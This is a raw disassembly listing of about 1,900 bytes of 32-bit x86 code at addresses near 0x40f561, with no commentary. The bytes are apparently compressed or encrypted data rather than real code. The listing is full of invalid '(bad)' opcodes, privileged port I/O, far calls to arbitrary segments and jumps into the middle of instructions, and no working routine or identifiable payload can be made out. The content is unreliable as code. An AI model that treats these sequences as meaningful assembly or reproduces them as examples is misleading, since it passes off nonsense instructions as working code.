  40f561:	xchg   edi,eax
  40f562:	cwde   
  40f563:	xchg   ebx,eax
  40f564:	mov    cl,0xfb
  40f566:	lods   eax,DWORD PTR ds:[esi]
  40f567:	push   ds
  40f568:	mov    edi,0x72894f34
  40f56d:	mov    ds:0xa254aba4,al
  40f572:	bound  esp,QWORD PTR [ebx+0x20063425]
  40f578:	mov    ecx,0x1ae39e10
  40f57d:	and    eax,0xb87e4081
  40f582:	addr16 xchg ebp,eax
  40f584:	jo     0x40f5bc
  40f586:	lods   eax,DWORD PTR ds:[esi]
  40f587:	dec    esp
  40f588:	sub    ch,ah
  40f58a:	retf   
  40f58b:	mov    ecx,0xc8415cd4
  40f590:	cdq    
  40f591:	mov    esp,0x2420cfe9
  40f596:	shl    DWORD PTR [edi],0x5c
  40f599:	or     BYTE PTR [ebx+0x639d6a03],bl
  40f59f:	adc    DWORD PTR [edi-0x76],esp
  40f5a2:	push   0xfffffff1
  40f5a4:	out    0x36,eax
  40f5a6:	and    ebp,DWORD PTR [ecx-0x9]
  40f5a9:	std    
  40f5aa:	push   edx
  40f5ab:	inc    eax
  40f5ac:	dec    edx
  40f5ad:	nop
  40f5ae:	imul   esp,DWORD PTR [ebp-0x47],0xffffffcd
  40f5b2:	cli    
  40f5b3:	jo     0x40f606
  40f5b5:	fmulp  st(6),st
  40f5b7:	ins    DWORD PTR es:[edi],dx
  40f5b8:	jo     0x40f5f6
  40f5ba:	push   edi
  40f5bb:	pushf  
  40f5bc:	ret    
  40f5bd:	xchg   esp,eax
  40f5be:	loope  0x40f60e
  40f5c0:	icebp  
  40f5c1:	(bad)  
  40f5c3:	ins    DWORD PTR es:[edi],dx
  40f5c4:	ror    DWORD PTR [esi],0x89
  40f5c7:	js     0x40f5f2
  40f5c9:	push   esi
  40f5ca:	(bad)  
  40f5cb:	mov    es,WORD PTR [eax]
  40f5cd:	aaa    
  40f5ce:	call   0x8773:0x4c1699bf
  40f5d5:	pop    edx
  40f5d6:	or     dh,ah
  40f5d8:	push   0xffffffd9
  40f5da:	xchg   DWORD PTR [edi+0x14],esi
  40f5dd:	push   eax
  40f5de:	icebp  
  40f5df:	scas   eax,DWORD PTR es:[edi]
  40f5e0:	or     bl,bl
  40f5e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e3:	sbb    BYTE PTR [ecx],dl
  40f5e5:	int3   
  40f5e6:	(bad)  
  40f5e7:	mov    dl,0x6
  40f5e9:	loope  0x40f665
  40f5eb:	fwait
  40f5ec:	cmc    
  40f5ed:	or     esp,DWORD PTR [ebx-0x18]
  40f5f0:	imul   esi,DWORD PTR [esi+0x5c8d9d70],0x49
  40f5f7:	pop    eax
  40f5f8:	pusha  
  40f5f9:	cmc    
  40f5fa:	test   eax,0x15ba47f1
  40f5ff:	cli    
  40f600:	adc    al,0x22
  40f602:	pop    ecx
  40f603:	dec    eax
  40f604:	and    al,0xc
  40f606:	push   ecx
  40f607:	sbb    eax,0x384f459
  40f60c:	jl     0x40f650
  40f60e:	int    0x7
  40f610:	fistp  DWORD PTR [edx-0x5ee8e6a]
  40f616:	xor    dh,BYTE PTR [edi+edx*2-0x77771b0b]
  40f61d:	and    al,0xf8
  40f61f:	cmp    dh,bl
  40f621:	xchg   esi,eax
  40f622:	cli    
  40f623:	jmp    0xf1f3:0xdb39ae84
  40f62a:	push   ebp
  40f62b:	pop    eax
  40f62c:	add    al,BYTE PTR [edi+0x16]
  40f62f:	test   DWORD PTR [ebp-0x7a],ebx
  40f632:	in     eax,0xf0
  40f634:	pop    eax
  40f635:	jo     0x40f669
  40f637:	out    0xff,eax
  40f639:	pusha  
  40f63a:	fcomp  DWORD PTR [edx-0x4e18e1ae]
  40f640:	push   ebx
  40f641:	out    0x7,al
  40f643:	add    BYTE PTR [ebp*8+0x3ce1a83e],bl
  40f64a:	sbb    eax,0x805b8c91
  40f64f:	mov    edx,?
  40f651:	and    cl,dl
  40f653:	mov    ah,0xda
  40f655:	jecxz  0x40f5e1
  40f657:	add    eax,0xf4a2d844
  40f65c:	outs   dx,DWORD PTR ds:[esi]
  40f65d:	or     ecx,DWORD PTR [edi+edi*8]
  40f660:	stc    
  40f661:	jnp    0x40f5e7
  40f663:	push   cs
  40f664:	jns    0x40f5fe
  40f666:	cwde   
  40f667:	pusha  
  40f668:	or     ch,BYTE PTR [edi-0x219c50e1]
  40f66e:	or     dl,BYTE PTR ds:0xe56119d
  40f674:	sbb    eax,0xa07434a0
  40f679:	jbe    0x40f6b4
  40f67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f67c:	push   ebx
  40f67d:	cmp    DWORD PTR [esi-0x2],0x5c
  40f681:	arpl   WORD PTR [ebx+esi*1],di
  40f684:	mov    ecx,0x74830b06
  40f689:	jno    0x40f6f8
  40f68b:	addr16 pushf 
  40f68d:	push   ss
  40f68e:	xchg   esi,eax
  40f68f:	fcmovnb st,st(5)
  40f691:	sub    BYTE PTR [esi-0x17d0ff58],bh
  40f697:	call   0xcba4:0x35c437f2
  40f69e:	ss aaa 
  40f6a0:	or     edx,esp
  40f6a2:	add    esi,DWORD PTR [ebx-0x30eeb1b4]
  40f6a8:	jae    0x40f69b
  40f6aa:	gs mov al,0x16
  40f6ad:	dec    esi
  40f6ae:	in     eax,dx
  40f6af:	fild   QWORD PTR [ecx+0x631efa7]
  40f6b5:	outs   dx,BYTE PTR ds:[esi]
  40f6b6:	pop    DWORD PTR [esi-0x23]
  40f6b9:	cli    
  40f6ba:	and    eax,0xa5e48912
  40f6bf:	je     0x40f641
  40f6c1:	dec    ebx
  40f6c2:	dec    ebx
  40f6c3:	test   dh,0x44
  40f6c6:	xchg   al,dl
  40f6c8:	cmp    al,0xa5
  40f6ca:	mov    BYTE PTR [eax],0x36
  40f6cd:	push   eax
  40f6ce:	ficomp DWORD PTR [ecx+0x5ac9e6a]
  40f6d4:	mov    ds:0x9a6d66c7,al
  40f6d9:	lds    esi,FWORD PTR [ecx+edi*4]
  40f6dc:	jns    0x40f759
  40f6de:	jne    0x40f6fa
  40f6e0:	xchg   esp,eax
  40f6e1:	ins    BYTE PTR es:[edi],dx
  40f6e2:	and    al,0xe9
  40f6e4:	fwait
  40f6e5:	or     al,0xc9
  40f6e7:	loope  0x40f762
  40f6e9:	loop   0x40f6bc
  40f6eb:	repnz fist DWORD PTR [edx+ebx*1]
  40f6ef:	and    eax,0x56342e65
  40f6f4:	fadd   QWORD PTR [edx-0x6c0d7ace]
  40f6fa:	(bad)  
  40f6fb:	xlat   BYTE PTR ds:[ebx]
  40f6fc:	rcr    DWORD PTR [ebx+0xec9a284],cl
  40f702:	cmp    esp,DWORD PTR [ebp+edi*1-0x1d652366]
  40f709:	into   
  40f70a:	and    DWORD PTR [eax+0x1b],ebp
  40f70d:	jge    0x40f769
  40f70f:	ror    DWORD PTR [ecx-0x34b2d6d6],cl
  40f715:	jmp    0x733d:0x8e41d5a0
  40f71c:	sbb    al,0x32
  40f71e:	dec    eax
  40f71f:	dec    edi
  40f720:	std    
  40f721:	jae    0x40f6e4
  40f723:	and    BYTE PTR [edx],dh
  40f725:	sbb    eax,0xecc3a986
  40f72a:	pop    ecx
  40f72b:	aaa    
  40f72c:	inc    ebx
  40f72d:	aam    0x90
  40f72f:	pop    eax
  40f730:	xor    dh,bh
  40f732:	or     eax,0x3bf1c0e1
  40f737:	jns    0x40f7b1
  40f739:	fld    TBYTE PTR [edi+eiz*1+0x26]
  40f73d:	sub    BYTE PTR [eax-0x6c7ca604],0xf8
  40f744:	dec    edi
  40f745:	pop    eax
  40f746:	(bad)  
  40f747:	xlat   BYTE PTR ds:[ebx]
  40f748:	outs   dx,DWORD PTR ds:[esi]
  40f749:	popa   
  40f74a:	and    al,0xb7
  40f74c:	xor    eax,0xc5e49da1
  40f751:	mov    al,BYTE PTR [ebp+0x5b9b4269]
  40f757:	xor    cl,al
  40f759:	mov    al,0xe6
  40f75b:	ret    0xf65a
  40f75e:	add    ah,ch
  40f760:	sbb    eax,0x506bdcaa
  40f765:	jbe    0x40f72e
  40f767:	pop    esi
  40f768:	sbb    eax,0xfab8ef79
  40f76d:	aam    0xa1
  40f76f:	into   
  40f770:	loopne 0x40f7ec
  40f772:	mov    ch,0x29
  40f774:	push   0xcb0ed4cc
  40f779:	xor    bh,bh
  40f77b:	pop    eax
  40f77c:	mov    bh,0x0
  40f77e:	jmp    0xc41aab9e
  40f783:	loop   0x40f71c
  40f785:	jnp    0x40f760
  40f787:	data16 jl 0x40f76c
  40f78a:	add    al,0x8
  40f78c:	fcmovu st,st(3)
  40f78e:	mov    dh,BYTE PTR [edi-0x45]
  40f791:	or     al,0xf2
  40f793:	popa   
  40f794:	jmp    0x40f7dc
  40f796:	fstp   QWORD PTR [edi+0x61518aa8]
  40f79c:	adc    BYTE PTR [ebx],cl
  40f79e:	and    bl,bh
  40f7a0:	into   
  40f7a1:	ret    0x707a
  40f7a4:	cmp    bh,BYTE PTR [ebx-0x6699a575]
  40f7aa:	inc    ebp
  40f7ab:	(bad)
  40f7af:	call   0x3029:0x290e97e0
  40f7b6:	fcomp  QWORD PTR [esi]
  40f7b8:	dec    eax
  40f7b9:	das    
  40f7ba:	dec    dh
  40f7bc:	cld    
  40f7bd:	dec    edx
  40f7be:	adc    DWORD PTR [edi+esi*4],esp
  40f7c1:	sub    edx,DWORD PTR [edi]
  40f7c3:	xchg   edx,eax
  40f7c4:	arpl   WORD PTR [edi+0x3c9aca9a],bx
  40f7ca:	jg     0x40f764
  40f7cc:	sbb    al,0xf8
  40f7ce:	sahf   
  40f7cf:	jmp    0xb948:0xfeda168e
  40f7d6:	pop    ss
  40f7d7:	int    0x31
  40f7d9:	pop    es
  40f7da:	mov    ds:0xd1bbcbf0,al
  40f7df:	mov    WORD PTR [ebx-0x3b8a9e86],?
  40f7e5:	xor    edi,DWORD PTR [edi-0x30]
  40f7e8:	fistp  QWORD PTR [esi-0x2a1877fe]
  40f7ee:	ins    BYTE PTR es:[edi],dx
  40f7ef:	lods   eax,DWORD PTR ds:[esi]
  40f7f0:	jl     0x40f852
  40f7f2:	mov    al,ds:0x98627e7
  40f7f7:	dec    ebp
  40f7f8:	in     eax,0x36
  40f7fa:	fld    QWORD PTR [eax-0x7d47a1d9]
  40f800:	aas    
  40f801:	or     BYTE PTR [esp+edi*4+0x7f],ah
  40f805:	jnp    0x40f7c8
  40f807:	icebp  
  40f808:	mov    ch,0xb0
  40f80a:	fisub  DWORD PTR [ebp+0x3d]
  40f80d:	adc    al,0x6
  40f80f:	inc    esp
  40f810:	adc    bh,bh
  40f812:	mov    eax,ds:0x88087059
  40f817:	loopne 0x40f86c
  40f819:	pop    ss
  40f81a:	sahf   
  40f81b:	pop    ecx
  40f81c:	in     eax,dx
  40f81d:	cmp    DWORD PTR [eax-0x48860386],edi
  40f823:	out    dx,eax
  40f824:	and    al,0x7c
  40f826:	arpl   WORD PTR [edi],bx
  40f828:	sbb    edx,edx
  40f82a:	dec    esi
  40f82b:	lods   eax,DWORD PTR ds:[esi]
  40f82c:	sub    DWORD PTR [ebp-0x1d],ebx
  40f82f:	or     ch,ah
  40f831:	sbb    bl,BYTE PTR [edx+0x78]
  40f834:	int    0x79
  40f836:	xchg   ebp,eax
  40f837:	(bad)  
  40f838:	repz rol bl,1
  40f83b:	ret    0x118d
  40f83e:	ja     0x40f857
  40f840:	aas    
  40f841:	aad    0x38
  40f843:	fdivr  DWORD PTR [ebx+0x3]
  40f847:	xor    al,BYTE PTR [eax]
  40f849:	popa   
  40f84a:	cmc    
  40f84b:	call   0xaf37:0x3fe15d16
  40f852:	in     al,dx
  40f853:	inc    edx
  40f854:	lds    ecx,FWORD PTR [ebp-0x517e3093]
  40f85a:	rcl    BYTE PTR [edi+0x40],1
  40f85d:	and    DWORD PTR [esi-0x74],0xffffffda
  40f861:	mov    ebx,0x4d5ddeba
  40f866:	xchg   esp,eax
  40f867:	jno    0x40f815
  40f869:	push   esi
  40f86a:	sub    BYTE PTR [esi-0x66],0xd3
  40f86e:	scas   eax,DWORD PTR es:[edi]
  40f86f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f870:	rcl    DWORD PTR [ebx-0x1cc14ef],1
  40f876:	xchg   ecx,eax
  40f877:	xlat   BYTE PTR ds:[ebx]
  40f878:	mov    eax,ds:0xef75274
  40f87d:	call   0xb8c6:0x8bbef6cf
  40f884:	bndstx [ebx+edi*8+0x2b9b6eed],bnd2
  40f88c:	xchg   edi,eax
  40f88d:	in     al,0x12
  40f88f:	mov    edi,0x479b309b
  40f895:	aad    0x20
  40f897:	dec    ebx
  40f898:	push   0x1
  40f89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f89b:	pop    eax
  40f89c:	push   0xc83b811b
  40f8a1:	jg     0x40f8fc
  40f8a3:	jg     0x40f88d
  40f8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a6:	adc    al,BYTE PTR [ebp-0x75]
  40f8a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8aa:	mov    esp,0xb2fb4220
  40f8af:	bound  ebx,QWORD PTR [edx-0x26]
  40f8b2:	pop    edx
  40f8b3:	cmp    BYTE PTR [ecx+0x36],ch
  40f8b6:	mov    ecx,0xf2a3de0
  40f8bb:	das    
  40f8bc:	xchg   edx,eax
  40f8bd:	clc    
  40f8be:	xchg   ebp,eax
  40f8bf:	mov    bh,0x12
  40f8c1:	mov    ah,0x8e
  40f8c3:	inc    ebx
  40f8c4:	and    eax,0xbd42508
  40f8c9:	xor    edi,DWORD PTR [ebx]
  40f8cb:	dec    edi
  40f8cc:	pop    edx
  40f8cd:	inc    ebx
  40f8cf:	inc    ebx
  40f8d0:	mov    al,ds:0x5fc6af2f
  40f8d5:	xlat   BYTE PTR ds:[ebx]
  40f8d6:	or     eax,0x6b11efd8
  40f8db:	test   eax,0xa53740e9
  40f8e0:	les    edi,FWORD PTR [eax-0x59d012eb]
  40f8e6:	and    bh,dh
  40f8e8:	jmp    0xc48367d
  40f8ed:	scas   eax,DWORD PTR es:[edi]
  40f8ee:	mov    ds:0x20c2c42f,eax
  40f8f3:	xchg   esi,eax
  40f8f4:	(bad)  
  40f8f5:	adc    dh,cl
  40f8f7:	cs mov esp,0xee2a5a21
  40f8fd:	dec    ecx
  40f8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ff:	xchg   edi,eax
  40f900:	not    DWORD PTR [ecx]
  40f902:	cwde   
  40f903:	mov    cl,BYTE PTR [esi-0x7046396f]
  40f909:	rsqrtps xmm2,XMMWORD PTR [edx-0x1a12865c]
  40f910:	popf   
  40f911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f912:	shl    BYTE PTR [esi-0xf],0x43
  40f916:	sub    eax,0x3655003a
  40f91b:	data16 in al,dx
  40f91d:	adc    BYTE PTR [edi],bh
  40f91f:	into   
  40f920:	lds    edi,FWORD PTR [esi+0x115e7ccd]
  40f926:	push   0x53
  40f928:	xchg   ebp,eax
  40f929:	test   al,0x7e
  40f92b:	inc    esp
  40f92c:	cmc    
  40f92d:	ror    DWORD PTR [ecx+0x6d],0x84
  40f931:	jle    0x40f8d9
  40f933:	repz jp 0x40f9a2
  40f936:	scas   eax,DWORD PTR es:[edi]
  40f937:	mov    gs,esi
  40f939:	jbe    0x40f942
  40f93b:	push   ebp
  40f93c:	mov    ebx,0xde6e936b
  40f941:	mov    ah,0x59
  40f943:	repnz stc 
  40f945:	cmp    al,0x83
  40f947:	inc    eax
  40f948:	ins    BYTE PTR es:[edi],dx
  40f949:	repnz inc ecx
  40f94b:	aad    0xa
  40f94d:	je     0x40f906
  40f94f:	push   0xc1fd255b
  40f954:	sahf   
  40f955:	mov    ?,WORD PTR [edx+0x43]
  40f958:	hlt    
  40f959:	out    dx,al
  40f95a:	test   DWORD PTR ds:0x1c815f9e,eax
  40f960:	sub    DWORD PTR [eax+0x70],edx
  40f963:	fimul  WORD PTR [ebp+0x28a6314f]
  40f969:	cmp    eax,ebx
  40f96b:	inc    ebp
  40f96c:	fmul   DWORD PTR [ecx+0x43e190b5]
  40f972:	loope  0x40f998
  40f974:	bnd jmp 0xe3e700c
  40f97a:	ja     0x40f930
  40f97c:	dec    ebx
  40f97d:	sbb    ch,BYTE PTR [ebx+0x7]
  40f980:	and    DWORD PTR es:[ecx],edi
  40f983:	add    eax,0xc99eadb
  40f988:	add    bh,BYTE PTR [ebp+0x4f80d15a]
  40f98e:	inc    ebp
  40f98f:	mov    al,BYTE PTR [eax+0x7b96822b]
  40f995:	push   ecx
  40f996:	and    edi,ecx
  40f998:	mov    eax,0x7704d7e0
  40f99d:	cld    
  40f99e:	(bad)  
  40f99f:	pop    edi
  40f9a0:	pop    edx
  40f9a1:	fstp   QWORD PTR [ebp-0x43]
  40f9a4:	and    edx,DWORD PTR [edx]
  40f9a6:	mov    ds:0xc0a5d65b,eax
  40f9ab:	mov    eax,ds:0x17c7b1
  40f9b0:	xchg   edi,eax
  40f9b1:	jns    0x40f9c7
  40f9b3:	js     0x40f9c4
  40f9b5:	popf   
  40f9b6:	jge    0x40f969
  40f9b8:	add    al,0xcd
  40f9ba:	mov    edi,0xba2bfb0e
  40f9bf:	sub    BYTE PTR [edi],bh
  40f9c1:	arpl   WORD PTR [ebp+0x19e22edb],bx
  40f9c7:	push   cs
  40f9c8:	push   0x3e
  40f9ca:	sar    bh,1
  40f9cc:	push   ecx
  40f9cd:	(bad)  
  40f9ce:	jne    0x40fa34
  40f9d0:	lock mov eax,0xa5fe8b29
  40f9d6:	aas    
  40f9d7:	in     eax,dx
  40f9d8:	in     al,dx
  40f9d9:	hlt    
  40f9da:	outs   dx,DWORD PTR ds:[esi]
  40f9db:	jo     0x40fa3e
  40f9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9de:	sbb    eax,DWORD PTR [esi-0x60]
  40f9e1:	xchg   esi,eax
  40f9e2:	mov    fs,WORD PTR [edi+0x408e6772]
  40f9e8:	cmc    
  40f9e9:	repnz or al,0xec
  40f9ec:	xchg   DWORD PTR [edi+0x23],edx
  40f9ef:	inc    esp
  40f9f0:	or     al,0xa5
  40f9f2:	xor    DWORD PTR ds:0xf0af0217,esp
  40f9f8:	jmp    0x40f9bc
  40f9fa:	jae    0x40f9a4
  40f9fc:	dec    ebx
  40f9fd:	jne    0x40fa60
  40f9ff:	xor    eax,0xee5ff889
  40fa04:	mov    ebp,0x323d7194
  40fa09:	cmc    
  40fa0a:	xor    bh,BYTE PTR [ecx+eiz*4-0x3b]
  40fa0e:	int3   
  40fa0f:	sub    bh,bh
  40fa11:	and    ch,dl
  40fa13:	jo     0x40f9b6
  40fa15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa16:	xchg   ecx,eax
  40fa17:	xchg   ebp,eax
  40fa18:	push   esp
  40fa19:	js     0x40f9e5
  40fa1b:	jp     0x40fa1d
  40fa1d:	(bad)  
  40fa1e:	call   0xb795e112
  40fa23:	add    al,BYTE PTR [esi-0x24]
  40fa26:	call   0x1a77:0x5fccd05b
  40fa2d:	test   DWORD PTR [ebx],esp
  40fa2f:	dec    eax
  40fa30:	or     bh,BYTE PTR [eax-0x76]
  40fa33:	cwde   
  40fa34:	dec    esp
  40fa35:	fsubr  QWORD PTR [esi-0x17]
  40fa38:	dec    eax
  40fa39:	sub    edi,DWORD PTR [ecx]
  40fa3b:	jmp    0xb1af5abd
  40fa40:	fldenv [esi-0x3a7590e3]
  40fa46:	cmp    bh,al
  40fa48:	sub    bl,ch
  40fa4a:	es and ebx,ecx
  40fa4d:	or     cl,cl
  40fa4f:	fwait
  40fa50:	das    
  40fa51:	int    0xc0
  40fa53:	dec    edx
  40fa54:	add    eax,0xad24fd37
  40fa59:	(bad)  
  40fa5b:	sub    DWORD PTR [edx],edx
  40fa5d:	sbb    eax,0x1f2a4572
  40fa62:	scas   al,BYTE PTR es:[edi]
  40fa63:	popa   
  40fa64:	mov    ds:0x4b75f4c5,eax
  40fa69:	mov    ecx,ecx
  40fa6b:	retf   
  40fa6c:	xor    esi,DWORD PTR ss:[esi-0x20]
  40fa70:	mov    ebp,0x34339d21
  40fa75:	push   esi
  40fa76:	sbb    DWORD PTR [ebx-0x5a],ebx
  40fa79:	call   0xb82201f1
  40fa7e:	xor    DWORD PTR [ecx+0x4480bc9a],esp
  40fa84:	cmp    eax,0xee9d30e8
  40fa89:	xchg   BYTE PTR [esi+0x588b1e1f],cl
  40fa8f:	(bad)  
  40fa90:	pop    ds
  40fa91:	sub    ecx,DWORD PTR [ebx-0x13]
  40fa94:	in     al,0x5c
  40fa96:	push   cs
  40fa97:	dec    esi
  40fa98:	adc    ch,al
  40fa9a:	(bad)  
  40fa9c:	xchg   edx,eax
  40fa9d:	ja     0x40fab0
  40fa9f:	dec    esp
  40faa0:	out    dx,al
  40faa1:	xor    BYTE PTR [ecx],dl
  40faa3:	inc    esi
  40faa4:	inc    eax
  40faa5:	dec    edi
  40faa6:	ret    
  40faa7:	pop    ss
  40faa8:	jg     0x40fac3
  40faaa:	adc    bh,bh
  40faac:	cmc    
  40faad:	mov    ebx,0x6f5e017e
  40fab2:	pop    ecx
  40fab3:	inc    ebp
  40fab4:	sub    esp,edi
  40fab6:	pusha  
  40fab7:	sbb    eax,0xa4fa2fae
  40fabc:	xchg   ebx,eax
  40fabd:	add    al,0xe1
  40fabf:	clts   
  40fac1:	lahf   
  40fac2:	add    bh,BYTE PTR [edx+0x65]
  40fac5:	sub    DWORD PTR [esi+0x609ce914],ecx
  40facb:	mov    cl,BYTE PTR [eax]
  40facd:	ss xor al,0x9a
  40fad0:	push   ss
  40fad1:	sub    bl,ah
  40fad3:	stos   DWORD PTR es:[edi],eax
  40fad4:	icebp  
  40fad5:	pop    ecx
  40fad6:	(bad)  
  40fad7:	out    dx,al
  40fad8:	jecxz  0x40fb4d
  40fada:	retf   
  40fadb:	xchg   edi,eax
  40fadc:	jle    0x40fb38
  40fade:	cli    
  40fadf:	dec    eax
  40fae0:	mov    fs:0x648d9aab,al
  40fae6:	(bad)  
  40fae8:	ins    BYTE PTR es:[edi],dx
  40fae9:	adc    dl,BYTE PTR [ecx-0x7f52fd55]
  40faef:	cmp    BYTE PTR [eax+ecx*8-0x614f8b46],dh
  40faf6:	inc    ebx
  40faf7:	and    ah,BYTE PTR [esi]
  40faf9:	adc    edi,esi
  40fafb:	or     al,0x3b
  40fafd:	fwait
  40fafe:	adc    eax,0xd57d6631
  40fb03:	pop    ebp
  40fb04:	shl    dh,0x41
  40fb07:	jmp    0x618eaed6
  40fb0c:	adc    eax,0x100ecdc9
  40fb11:	arpl   WORD PTR [esi+0x3f],si
  40fb14:	aaa    
  40fb15:	je     0x40fb36
  40fb17:	dec    esp
  40fb18:	rcr    DWORD PTR [esi-0x1bbb3d6f],0x49
  40fb1f:	sub    BYTE PTR [edx+0x5f],0x75
  40fb23:	lahf   
  40fb24:	adc    cl,ch
  40fb26:	mov    esp,0xbaf02947
  40fb2b:	xor    bh,BYTE PTR [ecx-0x57]
  40fb2e:	jle    0x40facb
  40fb30:	(bad)  
  40fb31:	sub    eax,esi
  40fb33:	sbb    DWORD PTR [ecx-0x6a68da38],0xffffffb0
  40fb3a:	mov    cl,BYTE PTR [ecx-0x16]
  40fb3d:	inc    ecx
  40fb3e:	xchg   edx,eax
  40fb3f:	mov    edx,0xc7c02e32
  40fb44:	test   al,0x94
  40fb46:	mov    ah,0x4d
  40fb48:	xchg   edx,eax
  40fb49:	retf   
  40fb4a:	adc    bh,BYTE PTR [esi-0x59]
  40fb4d:	push   0xd6ad61dc
  40fb52:	cs inc ebx
  40fb54:	pushf  
  40fb55:	fistp  DWORD PTR [ebx-0x4e]
  40fb58:	repnz imul eax,DWORD PTR [ebp-0x4c],0x7e5b863
  40fb60:	repz (bad) 
  40fb62:	adc    edx,edx
  40fb64:	xchg   ebx,eax
  40fb65:	je     0x40fbc6
  40fb67:	out    0x9c,al
  40fb69:	adc    DWORD PTR [esi+0xf],edi
  40fb6c:	scas   al,BYTE PTR es:[edi]
  40fb6d:	cdq    
  40fb6e:	iret   
  40fb6f:	retf   
  40fb70:	(bad)  
  40fb71:	xor    esi,DWORD PTR [ecx*1+0x7edd24d7]
  40fb78:	mov    al,0x1b
  40fb7a:	dec    ebp
  40fb7b:	das    
  40fb7c:	sbb    dh,ah
  40fb7e:	jecxz  0x40fbee
  40fb80:	sahf   
  40fb81:	mov    dl,0x4a
  40fb83:	dec    esp
  40fb84:	push   ds
  40fb85:	xchg   esi,eax
  40fb86:	dec    edx
  40fb87:	pop    esi
  40fb88:	gs (bad) 
  40fb8a:	jnp    0x40fb69
  40fb8c:	cld    
  40fb8d:	test   dh,bh
  40fb8f:	push   0x37247b54
  40fb94:	or     al,0xfa
  40fb96:	push   es
  40fb97:	test   al,0x30
  40fb99:	mov    ebx,0x6690590d
  40fb9e:	mov    bl,BYTE PTR [edx]
  40fba0:	gs (bad) 
  40fba3:	cwde   
  40fba4:	test   ebp,ecx
  40fba6:	lods   al,BYTE PTR ds:[esi]
  40fba7:	enter  0x6671,0x9a
  40fbab:	nop
  40fbac:	stos   BYTE PTR es:[edi],al
  40fbad:	sub    eax,0x251e40a2
  40fbb2:	sbb    cl,ah
  40fbb4:	sti    
  40fbb5:	retf   
  40fbb6:	pusha  
  40fbb7:	call   0x8137:0xb31338a
  40fbbe:	mov    ds:0xc99406b2,al
  40fbc3:	adc    bh,cl
  40fbc5:	cmp    al,BYTE PTR [edi+esi*8-0x4f]
  40fbc9:	retf   
  40fbca:	(bad)  [edi+0x7a]
  40fbcd:	or     eax,DWORD PTR [edi+0x2dd295dd]
  40fbd3:	xor    BYTE PTR [ebx+0x6c991e3],ah
  40fbd9:	push   esi
  40fbda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbdb:	cmp    eax,0xd2fb6c3f
  40fbe0:	dec    BYTE PTR [edx+edx*1]
  40fbe3:	jb     0x40fbb9
  40fbe5:	je     0x40fb6c
  40fbe7:	lea    edi,[edx]
  40fbe9:	xor    ax,0x5805
  40fbed:	cli    
  40fbee:	popf   
  40fbef:	or     DWORD PTR [esi-0x3b9a17f0],edi
  40fbf5:	or     DWORD PTR [ebp-0x80],eax
  40fbf8:	sbb    esi,ebx
  40fbfa:	cmp    al,0x5f
  40fbfc:	or     DWORD PTR [edx+0x73f5cecf],ebp
  40fc02:	jge    0x40fbfe
  40fc04:	sub    DWORD PTR [esp+eax*4],esi
  40fc07:	jle    0x40fc5f
  40fc09:	rol    esi,1
  40fc0b:	push   esi
  40fc0c:	push   ebx
  40fc0d:	mov    fs,WORD PTR [ebx-0x38e6b46]
  40fc13:	mov    ebp,0xd948b672
  40fc18:	call   0x97d2872
  40fc1d:	mov    WORD PTR [ebx+ebp*2-0x251f43b7],es
  40fc24:	push   es
  40fc25:	scas   eax,DWORD PTR es:[edi]
  40fc26:	or     al,0x4a
  40fc28:	lea    esi,[eax+0x58]
  40fc2b:	ret    0xb423
  40fc2e:	daa    
  40fc2f:	test   eax,0x6ccf63f6
  40fc34:	mov    eax,ds:0x1f08d595
  40fc39:	icebp  
  40fc3a:	ds ins DWORD PTR es:[edi],dx
  40fc3c:	aad    0xa4
  40fc3e:	adc    cl,BYTE PTR [ebx-0x1d]
  40fc41:	jbe    0x40fc39
  40fc43:	jl     0x40fc77
  40fc45:	ret    0xeb37
  40fc48:	pop    DWORD PTR [eax-0x3]
  40fc4b:	lds    edx,FWORD PTR [esi-0x40]
  40fc4e:	sub    eax,0x27c8c6e5
  40fc53:	clc    
  40fc54:	cmp    DWORD PTR [ebp+0x19d561e3],0xffffffdc
  40fc5b:	nop
  40fc5c:	addr16 stc 
  40fc5e:	inc    ebp
  40fc5f:	icebp  
  40fc60:	lock mov dl,0xa0
  40fc63:	retf   
  40fc64:	add    BYTE PTR [edx+0x35209781],cl
  40fc6a:	or     BYTE PTR [ebp-0x14],0x27
  40fc6e:	jl     0x40fc5c
  40fc70:	add    cl,ah
  40fc72:	cwde   
  40fc73:	js     0x40fcaa
  40fc75:	pop    edx
  40fc76:	pop    ebx
  40fc77:	mov    ebp,0xe661bcc
  40fc7c:	in     eax,dx
  40fc7d:	aaa    
  40fc7e:	and    al,ah
  40fc80:	into   
  40fc81:	inc    ecx
  40fc82:	lock mov ds:0x112f81ee,al
  40fc88:	dec    edx
  40fc89:	lea    edi,[edx]
  40fc8b:	inc    edi
  40fc8c:	hlt    
  40fc8d:	xor    edx,0xbff34686
  40fc93:	pusha  
  40fc94:	cwde   
  40fc95:	mov    ecx,0x435ec6aa
  40fc9a:	jecxz  0x40fc79
  40fc9c:	in     eax,0xa3
  40fc9e:	add    esp,eax
  40fca0:	pop    ecx
  40fca1:	mov    ebx,ebx
  40fca3:	sub    DWORD PTR [ebp+0x45],eax
  40fca6:	jno    0x40fc78
  40fca8:	inc    ecx
  40fca9:	or     ch,BYTE PTR [ebx]
  40fcab:	and    ebp,eax
  40fcad:	mov    ebp,0x64cedd57
  40fcb2:	jnp    0x40fd32
  40fcb4:	outs   dx,DWORD PTR ds:[esi]
  40fcb5:	loope  0x40fd31
  40fcb7:	enter  0xe504,0xb0
  40fcbb:	push   esp
  40fcbc:	sbb    ebp,DWORD PTR [esp+edx*1-0x8]
  40fcc0:	stos   BYTE PTR es:[edi],al
  40fcc1:	push   edi
  40fcc2:	push   edx
  40fcc3:	mov    edx,0x3f9a8daa
  40fcc8:	push   edx
  40fcc9:	pusha  
  40fcca:	xlat   BYTE PTR ds:[ebx]
  40fccb:	shl    DWORD PTR [esi+0x9],1
  40fcce:	fistp  WORD PTR [edx-0x7c]
